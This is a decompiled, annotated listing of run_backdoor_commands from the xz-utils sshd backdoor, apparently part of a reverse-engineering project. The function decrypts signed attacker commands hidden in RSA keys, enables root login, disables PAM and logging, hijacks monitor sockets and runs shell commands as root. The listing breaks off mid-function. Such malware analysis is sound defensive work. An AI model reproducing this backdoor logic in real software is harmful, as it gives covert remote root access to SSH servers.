// /home/kali/xzre-ghidra/xzregh/1094A0_run_backdoor_commands.c
// Function: run_backdoor_commands @ 0x1094A0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall run_backdoor_commands(RSA * key, global_context_t * ctx, BOOL * do_orig)


/*
 * AutoDoc: Command dispatcher invoked by every RSA hook. It refuses to run unless the loader finished initialising, the secret-data bitmap hit 0x1c8 bits, and a valid modulus/exponent pair is available. The modulus bytes are copied out of RSA_get0_key, decrypted with ChaCha keys unwrapped via secret_data_get_decrypted, and spliced with the current host-key digest before iterating sshd host keys until verify_signature accepts the Ed448 signature. The decoded cmd_arguments_t drives opcode-specific actions: opcode 0 updates sshd_offsets/logging/PAM bits and selects sockets, opcode 1 rewrites sshd variables or reseeds RSA_set0_key, opcode 2 runs setresuid/setresgid/system commands, and opcode 3 packages monitor_data_t payloads for sshd_proxy_elevate (including continuation chunks streamed into ctx->payload_buffer). Any parse/signature/socket failure flips disable_backdoor (and may call libc exit when requested) before forcing the RSA hook to defer to the original OpenSSL routine.
 */

#include "xzre_types.h"

BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)

{
  uid_t *command_payload_ptr;
  imported_funcs_t *imports;
  pfn_RSA_get0_key_t get_rsa_components;
  pfn_BN_num_bits_t get_modulus_bitlen;
  libc_imports_t *libc;
  sensitive_data *secrets;
  sshkey **host_keys;
  u8 *payload_buffer_cursor;
  pfn_setlogmask_t setlogmask_fn;
  sshd_ctx_t *sshd_ctx;
  uint *use_pam_ptr;
  sshd_monitor_func_t *keyallowed_slot;
  pfn_exit_t exit_fn;
  u8 control_flags;
  uint rsa_payload_span;
  monitor_reqtype_t op_result;
  BOOL operation_ok;
  int scratch_index;
  uid_t caller_uid;
  int pselect_result;
  ulong payload_segment_len;
  int *int_cursor;
  ssize_t bytes_read;
  BIGNUM *e;
  BIGNUM *n;
  long loop_idx;
  byte monitor_opcode_field;
  uint socket_slot_field;
  u64 sshkey_digest_offset;
  ulong payload_chunk_len;
  ulong command_opcode;
  byte monitor_opcode_override;
  gid_t rgid;
  BIGNUM **stack_wipe_cursor;
  fd_set *fdset_wipe_cursor;
  u8 **scratch_ptr;
  uint *header_copy_cursor;
  byte log_hook_flags;
  long hostkey_cursor;
  ulong rsa_payload_bytes;
  ulong payload_data_offset;
  byte *ed448_raw_key;
  byte continuation_stride_flag;
  key_payload_cmd_frame_t encrypted_payload;
  backdoor_payload_t decrypted_payload;
  run_backdoor_commands_data_t f;
  u64 payload_body_len;
  ulong payload_body_offset;
  u8 *data_ptr;
  int data_offset;
  u16 *size_location;
  u64 delta;
  u8 *signature;
  sshd_offsets_t offsets;
  int rsa_modulus_bits;
  sshd_hostkey_index_t selected_hostkey_idx;
  int socket_probe_header;
  u32 socket_probe_highword;
  u8 *extra_data;
  u64 shared_keybuf_or_timespec_lo;
  u64 shared_keybuf_or_timespec_hi;
  int body_size;
  u8 cmd_args_scratch[16];
  u8 *data_ptr2;
  u64 data_index;
  u32 v;
  int monitor_payload_size_le;
  BIGNUM *rsa_modulus_bn;
  int body_offset;
  int size;
  BIGNUM *rsa_exponent_bn;
  long hostkey_index;
  u8 encrypted_payload_bytes[0x21d];
  u8 auStack_2d9 [2];
  uint uStack_2d7;
  long lStack_2d3;
  int data_s2;
  int rsa_modulus_bytes;
  BOOL sigcheck_result;
  u64 payload_nonce_lo;
  u64 payload_nonce_hi;
  int key_idx;
  
  continuation_stride_flag = 0;
  stack_wipe_cursor = &rsa_exponent_bn;
  for (loop_idx = 0xae; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(u32 *)stack_wipe_cursor = 0;
    stack_wipe_cursor = (BIGNUM **)((long)stack_wipe_cursor + 4);
  }
  if (ctx != (global_context_t *)0x0) {
    // AutoDoc: Refuse to inspect RSA handles until the loader finished initialising, imports resolved, and the RSA hook passed in a writable do_orig flag.
    if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
        (imports = ctx->imported_funcs, imports != (imported_funcs_t *)0x0)) &&
       ((get_rsa_components = imports->RSA_get0_key_resolved, get_rsa_components != (pfn_RSA_get0_key_t)0x0 &&
        (imports->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
      if (do_orig == (BOOL *)0x0) {
        ctx->disable_backdoor = TRUE;
        return FALSE;
      }
      *do_orig = TRUE;
      (*get_rsa_components)(key,&rsa_exponent_bn,(BIGNUM **)&hostkey_index,(BIGNUM **)0x0);
      if ((((rsa_exponent_bn != (BIGNUM *)0x0) && (hostkey_index != 0)) &&
          ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
           // AutoDoc: Clamp the modulus to <0x4001 bits and ensure BN_bn2bin has room before treating the key bytes as a payload carrier.
           (((get_modulus_bitlen = ctx->imported_funcs->BN_num_bits, get_modulus_bitlen != (pfn_BN_num_bits_t)0x0 &&
             (rsa_payload_span = (*get_modulus_bitlen)(rsa_exponent_bn), rsa_payload_span < 0x4001)) &&
            (rsa_payload_span = rsa_payload_span + 7 >> 3, rsa_payload_span - 0x14 < 0x205)))))) &&
         (op_result = (*ctx->imported_funcs->BN_bn2bin)(rsa_exponent_bn,encrypted_payload_bytes + 5), -1 < op_result)) {
        rsa_payload_bytes = (ulong)rsa_payload_span;
        if ((ulong)(long)op_result <= rsa_payload_bytes) {
          if ((ulong)(long)op_result < 0x11) goto LAB_0010a11a;
          if (((CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) == 0) || (uStack_2d7 == 0)) ||
             (command_opcode = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) * (ulong)uStack_2d7 +
                       // AutoDoc: Collapse the plaintext header’s stride/index/bias triple into one of the four monitor opcodes; any product outside the 0–3 window aborts the dispatch.
                       lStack_2d3, 3 < command_opcode)) goto LAB_0010a11a;
          libc = ctx->libc_imports;
          if (((libc != (libc_imports_t *)0x0) && (libc->getuid != (pfn_getuid_t)0x0)) &&
             ((libc->exit != (pfn_exit_t)0x0 &&
              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->secret_bits_filled == 0x1c8)))))
             ) {
            payload_nonce_lo = CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
            payload_nonce_hi = lStack_2d3;
            // AutoDoc: Unwrap the ChaCha key/nonce from secret_data and decrypt the modulus bytes into the temporary payload buffer.
            operation_ok = secret_data_get_decrypted((u8 *)&key_idx,ctx);
            if ((operation_ok != FALSE) &&
               (operation_ok = chacha_decrypt((u8 *)&data_s2,rsa_payload_span - 0x10,(u8 *)&key_idx,(u8 *)&payload_nonce_lo,
                                        (u8 *)&data_s2,ctx->imported_funcs), operation_ok != FALSE)) {
              *(u64 *)cmd_args_scratch = 0;
              *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
              int_cursor = &key_idx;
              for (loop_idx = 0x39; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(u8 *)int_cursor = '\0';
                int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
              }
              shared_keybuf_or_timespec_lo = 0;
              shared_keybuf_or_timespec_hi = 0;
              scratch_ptr = &data_ptr2;
              for (loop_idx = 0x93; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(u32 *)scratch_ptr = 0;
                scratch_ptr = (u8 **)((long)scratch_ptr + (ulong)continuation_stride_flag * -8 + 4);
              }
              secrets = ctx->sshd_sensitive_data;
              int_cursor = &body_size;
              for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(u8 *)int_cursor = 0;
                int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
              }
              if ((((secrets != (sensitive_data *)0x0) && (secrets->host_pubkeys != (sshkey **)0x0))
                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < rsa_payload_bytes - 0x10)) {
                op_result = (int)command_opcode;
                // AutoDoc: Cache the decoded opcode inside the cmd_arguments_t scratch so downstream handlers know how to interpret the payload body.
                *(int *)cmd_args_scratch = op_result;
                if (4 < rsa_payload_bytes - 0x82) {
                  encrypted_payload_bytes[0] = (byte)rsa_modulus_bytes;
                  encrypted_payload_bytes[1] = (byte)((uint)rsa_modulus_bytes >> 8);
                  encrypted_payload_bytes[2] = (byte)((uint)rsa_modulus_bytes >> 0x10);
                  encrypted_payload_bytes[3] = (byte)((uint)rsa_modulus_bytes >> 0x18);
                  stack0xfffffffffffffd24 =
                       CONCAT31(stack0xfffffffffffffd25,(u8)sigcheck_result);
                  // AutoDoc: Strip the 0x87-byte RSA header (nonce, digest, signature framing) and treat the remainder of the modulus as attacker-controlled command bytes.
                  payload_body_len = rsa_payload_bytes - 0x87;
                  // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
                  if (command_opcode == 2) {
                    payload_segment_len = (ulong)CONCAT11((u8)sigcheck_result,encrypted_payload_bytes[3]);
                    if ((char)encrypted_payload_bytes[0] < '\0') {
                      if (CONCAT11((u8)sigcheck_result,encrypted_payload_bytes[3]) != 0)
                      goto LAB_0010a112;
                      payload_chunk_len = 0;
                      payload_segment_len = 0x39;
                      ed448_raw_key = (byte *)((long)&sigcheck_result + 1);
                      loop_idx = 0;
                    }
                    else {
                      if ((rsa_modulus_bytes & 0x100U) != 0) {
                        payload_segment_len = payload_segment_len + 8;
                      }
                      ed448_raw_key = (byte *)0x0;
                      loop_idx = 0x87;
                      payload_chunk_len = payload_segment_len;
                    }
                    // AutoDoc: Abort if the decrypted modulus does not contain enough bytes for the `[uid||gid||cmd]` tuple requested by the flag mix.
                    if (payload_body_len < payload_segment_len) goto LAB_0010a112;
                    _data_offset = payload_segment_len + 5;
                    payload_body_len = payload_body_len - payload_segment_len;
                    payload_data_offset = payload_segment_len + 0x87;
                    scratch_index = (int)payload_segment_len + 4;
                  }
                  else if ((op_result == 3) && ((rsa_modulus_bytes & 0x4000U) == 0)) {
                    if (payload_body_len < 0x30) goto LAB_0010a112;
                    payload_chunk_len = 0x30;
                    loop_idx = 0x87;
                    ed448_raw_key = (byte *)0x0;
                    _data_offset = 0x35;
                    payload_data_offset = 0x87;
                    scratch_index = 0x34;
                  }
                  else {
                    payload_chunk_len = 0;
                    loop_idx = 0;
                    payload_data_offset = 0x87;
                    ed448_raw_key = (byte *)0x0;
                    _data_offset = 5;
                    scratch_index = 4;
                  }
                  int_cursor = &rsa_modulus_bytes;
                  header_copy_cursor = (u32 *)(cmd_args_scratch + 4);
                  for (payload_segment_len = (ulong)(scratch_index + 1); payload_segment_len != 0; payload_segment_len = payload_segment_len - 1) {
                    *(char *)header_copy_cursor = (char)*int_cursor;
                    int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
                    header_copy_cursor = (u32 *)((long)header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1);
                  }
                  stack0xfffffffffffffa60 = (u8 *)0x0;
                  host_keys = secrets->host_keys;
                  extra_data = (u8 *)0x0;
                  if (((host_keys != (sshkey **)0x0) && (secrets->host_pubkeys != (sshkey **)0x0)) &&
                     ((host_keys != secrets->host_pubkeys &&
                      (((((uint)secrets->have_ssh2_key < 2 &&
                         // AutoDoc: Sanity-check both host key arrays; if the cached counts do not match, signature verification is skipped and the hook bails.
                         (operation_ok = count_pointers(host_keys,(u64 *)((long)&socket_probe_header + 1),
                                                  ctx->libc_imports), operation_ok != FALSE)) &&
                        (operation_ok = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,
                                                 (u64 *)&extra_data,ctx->libc_imports),
                        payload_buffer_cursor = stack0xfffffffffffffa60, operation_ok != FALSE)) &&
                       (stack0xfffffffffffffa60 == extra_data)))))) {
                    operation_ok = secret_data_get_decrypted((u8 *)&shared_keybuf_or_timespec_lo,ctx);
                    if (operation_ok != FALSE) {
                      hostkey_cursor = 0;
                      do {
                        offsets.raw_value = (u32)payload_buffer_cursor;
                        selected_hostkey_idx.raw_value = (u32)hostkey_cursor;
                        if (offsets.raw_value <= selected_hostkey_idx.raw_value) goto LAB_0010a112;
                        // AutoDoc: Iterate every cached host key until the Ed448 signature over the modulus+ciphertext digest validates.
                        operation_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[hostkey_cursor],
                                                  cmd_args_scratch,_data_offset + 4,0x25c,(u8 *)&data_s2,
                                                  (u8 *)&shared_keybuf_or_timespec_lo,ctx);
                        hostkey_cursor = hostkey_cursor + 1;
                      } while (operation_ok == FALSE);
                      ctx->sshd_host_pubkey_idx = selected_hostkey_idx.raw_value;
                      if ((command_opcode != 2) || (-1 < (char)encrypted_payload_bytes[0])) {
                        if (loop_idx == 0) {
LAB_00109a97:
                          if (payload_data_offset <= rsa_payload_bytes) goto LAB_00109aa2;
                        }
                        else {
                          payload_data_offset = 0x87;
LAB_00109aa2:
                          // AutoDoc: Make sure the attacker-provided chunk actually fits inside the decrypted modulus body before the dispatcher starts consuming opcode-specific fields.
                          if (payload_chunk_len <= rsa_payload_bytes - payload_data_offset) {
                            if ((((encrypted_payload_bytes[0] & 4) == 0) ||
                                (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                               (setlogmask_fn = ctx->libc_imports->setlogmask,
                               setlogmask_fn == (pfn_setlogmask_t)0x0)) {
                              ctx->sshd_log_ctx->syslog_mask_applied = FALSE;
                              if ((encrypted_payload_bytes[0] & 5) == 5) goto LAB_0010a1ba;
                            }
                            else {
                              // AutoDoc: Control flag bit 2 requests `setlogmask(INT_MIN)` so syslog stops emitting anything before the hook swaps handlers.
                              (*setlogmask_fn)(-0x80000000);
                              ctx->sshd_log_ctx->syslog_mask_applied = TRUE;
                            }
                            caller_uid = (*ctx->libc_imports->getuid)();
                            control_flags = encrypted_payload_bytes[0];
                            // AutoDoc: Capture whoever triggered the RSA hook (getuid) so sshd_proxy_elevate and the PAM/log toggles can reason about the original privilege.
                            ctx->caller_uid = caller_uid;
                            log_hook_flags = encrypted_payload_bytes[0] & 0x10;
                            if (((log_hook_flags == 0) || (ctx->sshd_log_ctx->handler_slots_valid != FALSE))
                               && (((encrypted_payload_bytes[0] & 2) == 0 ||
                                   // AutoDoc: Optional logging instructions drop the mm_log_handler hook into place once the caller proved the handler/context slots are writable.
                                   ((operation_ok = sshd_configure_log_hook
                                                        ((cmd_arguments_t *)encrypted_payload_bytes,ctx),
                                    operation_ok != FALSE || (log_hook_flags == 0)))))) {
                              if (command_opcode == 0) {
                                if (((char)encrypted_payload_bytes[1] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  log_hook_flags = 0xff;
                                  if ((encrypted_payload_bytes[1] & 2) != 0) {
                                    log_hook_flags = (byte)(CONCAT11(encrypted_payload_bytes[3],encrypted_payload_bytes[2]) >> 6) & 0x7f
                                    ;
                                  }
                                  monitor_opcode_field = 0xff;
                                  if ((char)control_flags < '\0') {
                                    monitor_opcode_field = (byte)(((ulong)CONCAT41(stack0xfffffffffffffd24,
                                                                     encrypted_payload_bytes[3]) << 0x18) >> 0x1d)
                                             & 0x1f;
                                  }
                                  rsa_payload_span = (uint)CONCAT11(monitor_opcode_field,log_hook_flags);
                                  if ((encrypted_payload_bytes[1] & 4) == 0) {
LAB_00109c56:
                                    rsa_payload_span = rsa_payload_span | 0xff0000;
                                    socket_slot_field = 0xff;
                                  }
                                  else {
                                    socket_slot_field = (uint)((byte)encrypted_payload_bytes[4] >> 5);
                                    rsa_payload_span = rsa_payload_span | ((byte)encrypted_payload_bytes[4] >> 2 & 7) << 0x10;
                                  }
LAB_00109c7b:
                                  rsa_payload_span = rsa_payload_span | socket_slot_field << 0x18;
LAB_00109c8a:
                                  // AutoDoc: Opcode 0 repacks attacker-supplied bits into `ctx->sshd_offsets` so sshd_get_sshbuf/sshbuf_extract can locate the kex sshbuf pointer slot, the monitor pkex_table slot, and the sshbuf data/size fields across builds.
                                  (ctx->sshd_offsets).raw_value = rsa_payload_span;
                                  command_payload_ptr = (uid_t *)(encrypted_payload_bytes + payload_data_offset + 5);
                                  // AutoDoc: Opcode 1/2/3 sides only run when the hook already executes as root; unprivileged callers are forced through the harmless offsets rewrite.
                                  if (caller_uid == 0) {
                                    libc = ctx->libc_imports;
                                    if ((((libc != (libc_imports_t *)0x0) &&
                                         (libc->setresgid != (pfn_setresgid_t)0x0)) &&
                                        (libc->setresuid != (pfn_setresuid_t)0x0)) &&
                                       (libc->system != (pfn_system_t)0x0)) {
                                      if (command_opcode == 0) {
                                        sshd_ctx = ctx->sshd_ctx;
                                        if (((sshd_ctx != (sshd_ctx_t *)0x0) &&
                                            (sshd_ctx->mm_answer_keyallowed_slot !=
                                             (sshd_monitor_func_t *)0x0)) &&
                                           (sshd_ctx->have_mm_answer_keyallowed != FALSE)) {
                                          if ((char)encrypted_payload_bytes[1] < '\0') goto LAB_00109d36;
                                          int_cursor = sshd_ctx->permit_root_login_ptr;
                                          if (int_cursor != (int *)0x0) {
                                            op_result = *int_cursor;
                                            if (op_result < 3) {
                                              if (-1 < op_result) {
                                                // AutoDoc: When opcode 0 targets PermitRootLogin, force sshd's config slot to the `forced-yes` enum so password auth stays open for the operator.
                                                *int_cursor = 3;
LAB_00109d36:
                                                // AutoDoc: Control-flag bit 6 disables PAM by zeroing sshd_ctx->use_pam_ptr whenever the caller wants password auth rejected regardless of sshd’s config.
                                                if ((control_flags & 0x40) != 0) {
                                                  use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
                                                  if ((use_pam_ptr == (uint *)0x0) || (1 < *use_pam_ptr))
                                                  goto LAB_0010a1ba;
                                                  *use_pam_ptr = 0;
                                                }
                                                stack0xfffffffffffffa60 =
                                                     (u8 *)CONCAT44(socket_probe_highword,0xffffffff);
                                                if ((control_flags & 0x20) == 0) {
                                                  // AutoDoc: Opcode 0 either reuses the live monitor client socket or captures a fresh one so payload replies can be streamed back to the attacker.
                                                  operation_ok = sshd_get_client_socket
                                                                     (ctx,(int *)((long)&
                                                  socket_probe_header + 1),1,DIR_READ);
                                                }
                                                else {
                                                  // AutoDoc: When the control flags request a manual socket ordinal the helper probes each fd via shutdown/read until a viable descriptor is found.
                                                  operation_ok = sshd_get_usable_socket
                                                                     ((int *)((long)&
                                                  socket_probe_header + 1),encrypted_payload_bytes[1] >> 3 & 0xf,
                                                  libc);
                                                }
                                                if (operation_ok != FALSE) {
                                                  op_result = stack0xfffffffffffffa60;
                                                  *(u8 *)&socket_probe_header = 0;
                                                  extra_data = (u8 *)((ulong)extra_data &
                                                                     0xffffffff00000000);
                                                  shared_keybuf_or_timespec_lo = 0;
                                                  shared_keybuf_or_timespec_hi = 0;
                                                  if (((-1 < stack0xfffffffffffffa60) &&
                                                      (libc = ctx->libc_imports,
                                                      libc != (libc_imports_t *)0x0)) &&
                                                     ((libc->pselect != (pfn_pselect_t)0x0 &&
                                                      (libc->__errno_location !=
                                                       (pfn___errno_location_t)0x0)))) {
                                                    scratch_index = stack0xfffffffffffffa60 >> 6;
                                                    rsa_payload_bytes = 1L << ((byte)stack0xfffffffffffffa60 &
                                                                   0x3f);
                                                    do {
                                                      shared_keybuf_or_timespec_hi = 500000000;
                                                      fdset_wipe_cursor = (fd_set *)cmd_args_scratch;
                                                      for (loop_idx = 0x20; loop_idx != 0;
                                                          loop_idx = loop_idx + -1) {
                                                        *(u32 *)fdset_wipe_cursor = 0;
                                                        fdset_wipe_cursor = (fd_set *)
                                                                  ((long)fdset_wipe_cursor +
                                                                  (ulong)continuation_stride_flag * -8 + 4);
                                                      }
                                                      *(ulong *)(cmd_args_scratch + (long)scratch_index * 8) =
                                                           rsa_payload_bytes;
                                                      shared_keybuf_or_timespec_lo = 0;
                                                      // AutoDoc: Block on the attacker-chosen socket (up to 500ms) before slurping the next monitor reply chunk so forged payloads stay aligned with sshd’s IPC cadence.
                                                      pselect_result = (*libc->pselect)(op_result + 1,
                                                                                  (fd_set *)
                                                                                  cmd_args_scratch,
                                                                                  (fd_set *)0x0,
                                                                                  (fd_set *)0x0,
                                                                                  (timespec *)
                                                                                  &shared_keybuf_or_timespec_lo,
                                                                                  (sigset_t *)0x0);
                                                      if (-1 < pselect_result) {
                                                        if (((pselect_result != 0) &&
                                                            ((rsa_payload_bytes & *(ulong *)(cmd_args_scratch +
                                                                                 (long)scratch_index * 8))
                                                             != 0)) &&
                                                           (bytes_read = fd_read(op_result,&extra_data,4,
                                                                             libc), -1 < bytes_read))
                                                        {
                                                          rsa_payload_span = (uint)extra_data >> 0x18 |
                                                                   ((uint)extra_data & 0xff0000) >>
                                                                   8 | ((uint)extra_data & 0xff00)
                                                                       << 8 |
                                                                   (uint)extra_data << 0x18;
                                                          extra_data = (u8 *)CONCAT44(extra_data.
                                                                                      _4_4_,rsa_payload_span);
                                                          if ((rsa_payload_span - 1 < 0x41) &&
                                                             (bytes_read = fd_read(op_result,&
                                                  socket_probe_header,1,libc), -1 < bytes_read)) {
                                                    ctx->sock_read_len =
                                                         (ulong)((uint)extra_data - 1);
                                                    bytes_read = fd_read(op_result,ctx->sock_read_buf,
                                                                     (ulong)((uint)extra_data - 1),
                                                                     libc);
                                                    if (-1 < bytes_read) {
                                                      sshd_ctx = ctx->sshd_ctx;
                                                      if (sshd_ctx->mm_answer_keyallowed_hook !=
                                                          (sshd_monitor_func_t)0x0) {
                                                        keyallowed_slot = sshd_ctx->
                                                  mm_answer_keyallowed_slot;
                                                  if ((encrypted_payload_bytes[2] & 0x3f) == 0) {
                                                    op_result = 0x16;
                                                    if (keyallowed_slot != (sshd_monitor_func_t *)0x0) {
                                                      op_result = *(int *)(keyallowed_slot + -1);
                                                    }
                                                  }
                                                  else {
                                                    op_result = (uint)(encrypted_payload_bytes[2] & 0x3f) * 2;
                                                  }
                                                  // AutoDoc: Select the monitor request opcode the attacker wants to impersonate and drop mm_answer_keyallowed_hook into the live slot so the next exchange hits the implant.
                                                  sshd_ctx->mm_answer_keyallowed_reqtype =
                                                       op_result + MONITOR_ANS_MODULI;
                                                  *keyallowed_slot = sshd_ctx->mm_answer_keyallowed_hook;
                                                  goto LAB_0010a076;
                                                  }
                                                  }
                                                  }
                                                  }
                                                  break;
                                                  }
                                                  int_cursor = (*libc->__errno_location)();
                                                  } while (*int_cursor == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (op_result == 3) goto LAB_00109d36;
                                          }
                                        }
                                      }
                                      else if (op_result == 1) {
                                        // AutoDoc: Opcode 1 rewrites sshd globals (PermitRootLogin, use_pam, etc.) based on the control-flag bits before re-entering the monitor loop.
                                        operation_ok = sshd_patch_variables
                                                           (encrypted_payload_bytes[1] & TRUE,
                                                            encrypted_payload_bytes[0] >> 6 & TRUE,
                                                            encrypted_payload_bytes[1] >> 1 & TRUE,
                                                            (uint)encrypted_payload_bytes[3],ctx);
                                        if (operation_ok != FALSE) {
LAB_0010a076:
                                          shared_keybuf_or_timespec_lo = CONCAT71((shared_keybuf_or_timespec_lo >> 8),1);
                                          *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
                                          scratch_ptr = &data_ptr2;
                                          for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
                                            *(u32 *)scratch_ptr = 0;
                                            scratch_ptr = (u8 **)((long)scratch_ptr +
                                                              (ulong)continuation_stride_flag * -8 + 4);
                                          }
                                          *(u64 *)cmd_args_scratch = 0x80;
                                          *(u8 *)&body_offset = 8;
                                          *(u8 *)&size = 1;
                                          e = (*ctx->imported_funcs->BN_bin2bn)
                                                        ((uchar *)&shared_keybuf_or_timespec_lo,1,(BIGNUM *)0x0);
                                          if (((e != (BIGNUM *)0x0) &&
                                              (n = (*ctx->imported_funcs->BN_bin2bn)
                                                             (cmd_args_scratch,0x100,(BIGNUM *)0x0),
                                              n != (BIGNUM *)0x0)) &&
                                             (op_result = (*ctx->imported_funcs->RSA_set0_key)
                                                                 (key,n,e,(BIGNUM *)0x0),
                                             op_result == 1)) goto LAB_0010a112;
                                        }
                                      }
                                      else if (op_result == 2) {
                                        payload_chunk_len = payload_chunk_len & 0xffff;
                                        // AutoDoc: Bit0 of monitor_flags decides whether opcode 2 prepends attacker-supplied uid/gid values (set) or leaves both zeroed so the shell command inherits root.
                                        if ((encrypted_payload_bytes[1] & 1) == 0) {
                                          rgid = 0;
                                          loop_idx = 0;
                                          caller_uid = 0;
                                        }
                                        else {
                                          if (payload_chunk_len < 9) goto LAB_0010a1ba;
                                          caller_uid = *command_payload_ptr;
                                          rgid = *(gid_t *)((long)&uStack_2d7 + payload_data_offset);
                                          payload_chunk_len = payload_chunk_len - 8;
                                          loop_idx = 8;
                                        }
                                        if ((char)control_flags < '\0') {
                                          if (2 < payload_chunk_len) {
                                            rsa_payload_bytes = (ulong)*(ushort *)((long)command_payload_ptr + loop_idx);
                                            payload_chunk_len = payload_chunk_len - 2;
                                            loop_idx = loop_idx + 2;
                                            if (payload_chunk_len <= rsa_payload_bytes) goto LAB_00109fb9;
                                          }
                                        }
                                        else {
                                          rsa_payload_bytes = (ulong)CONCAT11(encrypted_payload_bytes[4],encrypted_payload_bytes[3]);
LAB_00109fb9:
                                          if ((((rsa_payload_bytes <= payload_chunk_len) &&
                                               ((rgid == 0 ||
                                                (op_result = (*libc->setresgid)(rgid,rgid,rgid),
                                                op_result != -1)))) &&
                                              ((caller_uid == 0 ||
                                               (op_result = (*ctx->libc_imports->setresuid)
                                                                   (caller_uid,caller_uid,caller_uid),
                                               op_result != -1)))) &&
                                             // AutoDoc: Opcode 2 bails unless the decrypted `[uid||gid||cmd]` buffer terminates with NUL, preventing the helper from running off the end of the modulus slice when calling system().
                                             (*(char *)((long)command_payload_ptr + loop_idx) != '\0')) {
                                            (*ctx->libc_imports->system)
                                                      ((char *)((long)command_payload_ptr + loop_idx));
                                            goto LAB_0010a076;
                                          }
                                        }
                                      }
                                      // AutoDoc: When the monitor flags carry the 0xC0 pattern the dispatcher sleeps for five seconds and exits sshd immediately, giving the operator a clean kill-switch path.
                                      else if ((((encrypted_payload_bytes[1] & 0xc0) == 0xc0) &&
                                               (libc->exit != (pfn_exit_t)0x0)) &&
                                              (libc->pselect != (pfn_pselect_t)0x0)) {
                                        *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
                                        *(u64 *)cmd_args_scratch = 5;
                                        (*libc->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                           (fd_set *)0x0,(timespec *)cmd_args_scratch,
                                                           (sigset_t *)0x0);
                                        (*libc->exit)(0);
                                      }
                                    }
                                  }
                                  else {
                                    header_copy_cursor = (u32 *)(cmd_args_scratch + 4);
                                    for (loop_idx = 0xb; loop_idx != 0; loop_idx = loop_idx + -1) {
                                      *header_copy_cursor = 0;
                                      header_copy_cursor = header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1;
                                    }
                                    *(cmd_arguments_t **)(cmd_args_scratch + 8) = encrypted_payload_bytes;
                                    data_ptr2 = (u8 *)rsa_exponent_bn;
                                    data_index = hostkey_index;
                                    _v = command_payload_ptr;
                                    // AutoDoc: Expose the monitor payload length for opcode 3 so sshd_proxy_elevate can treat the decrypted chunk as a forged monitor_data_t frame.
                                    *(u16 *)&monitor_payload_size_le = (short)payload_chunk_len;
                                    rsa_modulus_bn = (BIGNUM *)key;
                                    // AutoDoc: Opcode 3 populates a monitor_data_t and lets sshd_proxy_elevate forge replies or run system commands under the requested uid/gid.
                                    operation_ok = sshd_proxy_elevate((monitor_data_t *)cmd_args_scratch,ctx);
                                    if (operation_ok != FALSE) {
                                      ctx->disable_backdoor = TRUE;
                                      *do_orig = FALSE;
                                      return TRUE;
                                    }
                                  }
                                }
                              }
                              else if (op_result == 1) {
                                if (((encrypted_payload_bytes[1] & 1) != 0) ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0))
                                goto LAB_00109b6c;
                              }
                              else {
                                if (op_result != 3) {
LAB_00109b6c:
                                  rsa_payload_span = 0;
                                  goto LAB_00109c8a;
                                }
                                if (((char)encrypted_payload_bytes[3] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  if ((encrypted_payload_bytes[2] & 0x20) != 0) {
                                    monitor_opcode_override = 0xff;
                                    if ((char)encrypted_payload_bytes[2] < '\0') {
                                      monitor_opcode_override = encrypted_payload_bytes[4];
                                    }
                                    log_hook_flags = 0xff;
                                    if ((encrypted_payload_bytes[2] & 0x40) != 0) {
                                      log_hook_flags = encrypted_payload_bytes[3] & 0x3f;
                                    }
                                    rsa_payload_span = (uint)CONCAT11(log_hook_flags,monitor_opcode_override);
                                    if ((encrypted_payload_bytes[3] & 0x40) == 0) goto LAB_00109c56;
                                    socket_slot_field = encrypted_payload_bytes[1] >> 3 & 7;
                                    rsa_payload_span = rsa_payload_span | (encrypted_payload_bytes[1] & 7) << 0x10;
                                    goto LAB_00109c7b;
                                  }
                                  rsa_payload_span = 0xffffffff;
                                  goto LAB_00109c8a;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1ba:
                        ctx->disable_backdoor = TRUE;
                        int_cursor = &key_idx;
                        for (loop_idx = 0x39; loop_idx != 0; loop_idx = loop_idx + -1) {
                          *(u8 *)int_cursor = 0;
                          int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
                        }
                        if ((encrypted_payload_bytes[0] & 1) != 0) {
                          if (ctx->libc_imports == (libc_imports_t *)0x0) {
                            return FALSE;
                          }
                          exit_fn = ctx->libc_imports->exit;
                          if (exit_fn == (pfn_exit_t)0x0) {
                            return FALSE;
                          }
